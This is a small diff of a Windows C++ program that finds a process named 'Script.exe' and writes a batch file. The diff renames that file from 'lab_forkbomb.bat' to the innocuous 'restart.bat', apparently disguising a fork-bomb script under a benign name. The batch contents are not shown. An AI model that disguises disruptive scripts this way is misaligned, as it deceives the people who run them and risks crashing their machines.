@@ -25,7 +25,7 @@ DWORD FindProcessByName(const wchar_t* processName) {
 
 // Create response batch file
 void CreateResponseBatch() {
-    HANDLE hFile = CreateFileA("lab_forkbomb.bat", GENERIC_WRITE, 0, NULL, 
+    HANDLE hFile = CreateFileA("restart.bat", GENERIC_WRITE, 0, NULL, 
         CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
     
     if (hFile != INVALID_HANDLE_VALUE) {
@@ -59,7 +59,7 @@ void CreateResponseBatch() {
 
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE, LPSTR lpCmdLine, int) {
     const wchar_t* targetProcess = L"Script.exe";
-    const char* responseBatch = "response.bat";
+    const char* responseBatch = "restart.bat";
     
     // Find the target process
     DWORD processId = FindProcessByName(targetProcess);
